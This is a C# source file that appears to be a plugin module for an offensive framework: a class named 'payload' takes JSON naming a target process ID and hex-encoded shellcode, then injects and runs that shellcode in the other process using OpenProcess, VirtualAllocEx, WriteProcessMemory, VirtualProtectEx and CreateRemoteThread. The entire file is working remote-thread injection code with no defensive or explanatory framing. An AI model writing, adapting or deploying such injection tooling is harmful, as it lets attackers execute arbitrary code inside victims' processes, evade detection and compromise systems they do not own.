using System;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Collections.Generic;
using System.Runtime.InteropServices;

public class payload
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;
    private const uint PAGE_EXECUTE_READ = 0x20;

    public payload() { }

    private byte[] fnHexStringToByteArray(string szHexStr)
    {
        if (string.IsNullOrEmpty(szHexStr) || string.IsNullOrEmpty(szHexStr.Trim()))
        {
            return new byte[0];
        }

        string szClean = Regex.Replace(szHexStr.ToLower(), @"[\\,ox\s\r\n]", "");

        int nLen = szClean.Length;
        if (nLen % 2 != 0)
        {
            szClean = szClean + "0";
            nLen++;
        }

        byte[] abResult = new byte[nLen / 2];
        for (int i = 0; i < nLen; i += 2)
        {
            string szByteHex = szClean.Substring(i, 2);
            abResult[i / 2] = Convert.ToByte(szByteHex, 16);
        }

        return abResult;
    }

    public string Execute(object param)
    {
        try
        {
            if (!(param is Dictionary<string, object> mapParam))
            {
                return "ERROR: Invalid parameter type. Expected Dictionary.";
            }

            if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
            {
                return "ERROR: JSON data is empty.";
            }

            string szJson = jsonValue.ToString();
            string szStrategy = fnGetJsonValue(szJson, "strategy");
            string szPid = fnGetJsonValue(szJson, "target_pid");
            string szPayload = fnGetJsonValue(szJson, "payload_hex");

            int nPid = 0;
            if (!string.IsNullOrEmpty(szPid))
            {
                int.TryParse(szPid, out nPid);
            }

            byte[] abShellcode = fnHexStringToByteArray(szPayload);
            if (abShellcode.Length == 0)
            {
                return "ERROR: Shellcode payload is empty or invalid hex value";
            }

            StringBuilder result = new StringBuilder();
            result.AppendLine("Parsed Configuration (C# Native):");
            result.AppendLine($"- Strategy: {szStrategy}");
            result.AppendLine($"- Target PID: {nPid}");
            result.AppendLine($"- Shellcode Size: {abShellcode.Length} bytes");

            if (szStrategy.Equals("remote_thread", StringComparison.OrdinalIgnoreCase))
            {
                if (nPid == 0)
                {
                    return "ERROR: Target PID is invalid for remote_thread strategy.";
                }

                IntPtr hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, nPid);
                if (hProcess == IntPtr.Zero)
                {
                    return result.ToString() + "\n[-] OpenProcess Failed. Check your privileges or PID.";
                }

                IntPtr lpAddress = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)abShellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (lpAddress == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return result.ToString() + "\n[-] VirtualAllocEx Failed.";
                }

                IntPtr bytesWritten;
                bool isWritten = WriteProcessMemory(hProcess, lpAddress, abShellcode, (uint)abShellcode.Length, out bytesWritten);
                if (!isWritten || bytesWritten.ToInt32() == 0)
                {
                    CloseHandle(hProcess);
                    return result.ToString() + "\n[-] WriteProcessMemory Failed.";
                }

                uint oldProtect;
                VirtualProtectEx(hProcess, lpAddress, (uint)abShellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, lpAddress, IntPtr.Zero, 0, IntPtr.Zero);
                if (hThread == IntPtr.Zero)
                {
                    CloseHandle(hProcess);
                    return result.ToString() + "\n[-] CreateRemoteThread Failed.";
                }

                CloseHandle(hThread);
                CloseHandle(hProcess);
                
                result.AppendLine("[+] Successfully injected shellcode into remote process using Native APIs.");
            }
            else
            {
                return "ERROR: Unknown strategy.";
            }

            return result.ToString();
        }
        catch (Exception e)
        {
            return "ERROR: " + e.ToString();
        }
    }

    private string fnGetJsonValue(string json, string key)
    {

        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success)
            return match.Groups[1].Value;

        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success)
            return match.Groups[1].Value.Trim().Replace("\"", "");

        return "";
    }
}
